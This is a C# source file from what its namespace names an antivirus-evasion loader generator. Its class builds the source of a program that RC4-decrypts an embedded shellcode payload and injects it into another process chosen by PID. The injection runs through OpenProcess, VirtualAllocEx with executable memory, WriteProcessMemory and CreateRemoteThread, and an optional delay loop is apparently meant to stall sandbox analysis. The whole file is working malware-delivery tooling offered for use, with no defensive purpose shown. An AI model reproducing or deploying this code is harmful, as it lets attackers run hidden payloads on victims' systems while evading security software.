using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace 掩日___免杀执行器生成工具
{
    class TP_VirtualAllocEx_Exist
    {
        string code;

        public TP_VirtualAllocEx_Exist(string decKey, string encPayload, int pid)
        {
            code = @"
                                using System;
                                using System.Collections.Generic;
                                using System.Linq;
                                using System.Runtime.InteropServices;
                                using System.Diagnostics;

                                namespace whocare
                                {
                                         static class Decryptor
                                            {
                                                public static byte[] Decrypt(byte[] key, byte[] data)
                                                {
                                                    return EncryptOutput(key, data).ToArray();
                                                }
                                                private static byte[] EncryptInitalize(byte[] key)
                                                {
                                                    byte[] s = Enumerable.Range(0, 256)
                                                      .Select(i => (byte)i)
                                                      .ToArray();

                                                    for (int i = 0, j = 0; i < 256; i++)
                                                    {
                                                        j = (j + key[i % key.Length] + s[i]) & 255;

                                                        Swap(s, i, j);
                                                    }

                                                    return s;
                                                }
                                                private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
                                                {
                                                    byte[] s = EncryptInitalize(key);

                                                    int i = 0;
                                                    int j = 0;

                                                    return data.Select((b) =>
                                                    {
                                                        i = (i + 1) & 255;
                                                        j = (j + s[i]) & 255;

                                                        Swap(s, i, j);

                                                        return (byte)(b ^ s[(s[i] + s[j]) & 255]);
                                                    });
                                                }
                                                private static void Swap(byte[] s, int i, int j)
                                                {
                                                    byte c = s[i];

                                                    s[i] = s[j];
                                                    s[j] = c;
                                                }

                                            }
                                        

                                        class Program
                                        {


                                        static void Main(string[] args)
                                        {
                                                //delay_code_here
                                                byte[] KEY = {" + decKey + @"};
                                         
                                                var pid = "+ pid + @";
                                                
                                                string Payload_Encrypted = """ + encPayload +
                                                @""";string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(',');

                                                byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];

                                                for (int i = 0; i < Payload_Encrypted_Without_delimiterChar.Length; i++)
                                                {
                                                    byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());
                                                    _X_to_Bytes[i] = current;
                                                }
                                                byte[] Finall_Payload = Decryptor.Decrypt(KEY, _X_to_Bytes);


                                                uint dwThreadId = 0;


                                                var handle_1 = ConstantsAndExtCalls.OpenProcess(ConstantsAndExtCalls.PROCESS_CREATE_THREAD| ConstantsAndExtCalls.PROCESS_VM_READ | ConstantsAndExtCalls.PROCESS_QUERY_INFORMATION| ConstantsAndExtCalls.PROCESS_VM_OPERATION | ConstantsAndExtCalls.PROCESS_VM_WRITE, true, pid); 
                                                IntPtr funcAddress = ConstantsAndExtCalls.VirtualAllocEx(handle_1, IntPtr.Zero, (UInt32)Finall_Payload.Length, ConstantsAndExtCalls.MEM_COMMIT|ConstantsAndExtCalls.MEM_RESERVE, ConstantsAndExtCalls.PAGE_EXECUTE_READWRITE);
                                                ConstantsAndExtCalls.WriteProcessMemory(handle_1, funcAddress, Finall_Payload, Finall_Payload.Length, ref dwThreadId);
                                                ConstantsAndExtCalls.CreateRemoteThread(handle_1, IntPtr.Zero, 0, funcAddress, IntPtr.Zero, 0, out dwThreadId);
                                                }

                                            }

                                        }
                                        public static class ConstantsAndExtCalls
                                        {
                                            public const int PROCESS_CREATE_THREAD = 0x0002;
                                            public const int PROCESS_QUERY_INFORMATION = 0x0400;
                                            public const int PROCESS_VM_OPERATION = 0x0008;
                                            public const int PROCESS_VM_WRITE = 0x0020;
                                            public const int PROCESS_VM_READ = 0x0010;
                                            public const uint MEM_RESERVE = 0x00002000;
                                            public const uint PAGE_READWRITE = 4;
                                            public const int SW_HIDE = 0;
                                            public const int SW_SHOW = 5;
                                            public const int VIRTUAL_MEM = (0x1000 | 0x2000);
                                            public static UInt32 MEM_COMMIT = 0x1000;
                                            public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
                                            public static int PROCCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF);


                                            [DllImport(""Kernel32.dll"", SetLastError = true)]
                                            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref uint lpNumberofBytesWritten);
                                            [DllImport(""Kernel32.dll"")]
                                            public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
                                            [DllImport(""Kernel32.dll"")]
                                            public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
                                            [DllImport(""Kernel32.dll"", SetLastError = true, ExactSpelling = true)]
                                            public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect);
                                            [DllImport(""Kernel32.dll"")]
                                            public static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
                                            [DllImport(""Kernel32.dll"")]
                                            public static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);
                                            [DllImport(""kernel32"")]
                                            public static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
                                            [DllImport(""kernel32"")]
                                            public static extern bool CloseHandle(IntPtr handle);
                                            [DllImport(""kernel32"")]
                                            public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
                                            [DllImport(""kernel32"")]
                                            public static extern IntPtr GetModuleHandle(string moduleName);
                                            [DllImport(""kernel32"")]
                                            public static extern UInt32 GetProcAddress(IntPtr hModule, string procName);
                                            [DllImport(""kernel32"")]
                                            public static extern UInt32 LoadLibrary(string lpFileName);
                                            [DllImport(""kernel32"")]
                                            public static extern UInt32 GetLastError();
                                            [DllImport(""kernel32"")]
                                            public static extern IntPtr GetConsoleWindow();
                                            [DllImport(""user32.dll"")]
                                            public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
                                            [DllImport(""kernel32"", SetLastError = true)]
                                            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
                                        }";

        }


        public String GetCode()
        {
            //添加延时代码
            if (Global_Var.delay != 0)
            {
                string delay_temp = @"int z;
for (int j = 0; j < " + Global_Var.delay.ToString() + @"; j++)
{ for (int i = 0; i < 1000000; i++)
		{
			Random rd = new Random();
			z = rd.Next();
			z++;
		}}";
                code = code.Replace(@"//delay_code_here", delay_temp);
            }
            return code;
        }
    }
}
